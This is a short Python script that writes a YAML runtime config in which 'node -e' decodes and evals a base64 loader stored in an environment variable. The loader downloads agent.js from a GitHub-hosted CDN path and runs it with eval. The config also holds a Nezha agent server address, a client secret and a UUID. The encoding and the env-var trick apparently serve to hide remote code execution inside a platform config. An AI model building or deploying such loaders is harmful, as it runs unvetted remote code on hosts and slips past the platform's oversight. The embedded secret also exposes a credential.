#!/usr/bin/env python3
"""Use env var to pass script, -e code uses process.env (no quotes needed)"""
import base64

# The loader JS that fetches agent.js from CDN
loader_js = 'require("https").get("https://cdn.jsdelivr.net/gh/zx1447/nextindeex@main/nezha-pure-node/agent.js",function(r){var d="";r.on("data",function(c){d+=c});r.on("end",function(){eval(d)})})'

loader_b64 = base64.b64encode(loader_js.encode()).decode()

# The -e script: NO QUOTES needed! Uses process.env
# eval(Buffer.from(process.env.LOADER,process.env.ENC).toString())
eval_script = "eval(Buffer.from(process.env.LOADER,process.env.ENC).toString())"

yaml = f'''runtime:
  args:
    - "node"
    - "-e"
    - "{eval_script}"
  env:
    NZ_SERVER: "nz.zxydk1715.dpdns.org:443"
    NZ_TLS: "true"
    NZ_CLIENT_SECRET: "BFbvpxSlBTUugp3gDzezVKkZ22BV0CeL"
    NZ_UUID: "c592af8b-b49f-e6cf-8f68-f3c57faec830"
    TZ: "Asia/Shanghai"
    LOADER: "{loader_b64}"
    ENC: "base64"
'''

with open('/home/z/my-project/scripts/nezha-sin-edit.yaml', 'w') as f:
    f.write(yaml)

print(f"loader_b64 length: {len(loader_b64)}")
print(f"eval_script: {eval_script}")
print("YAML written")
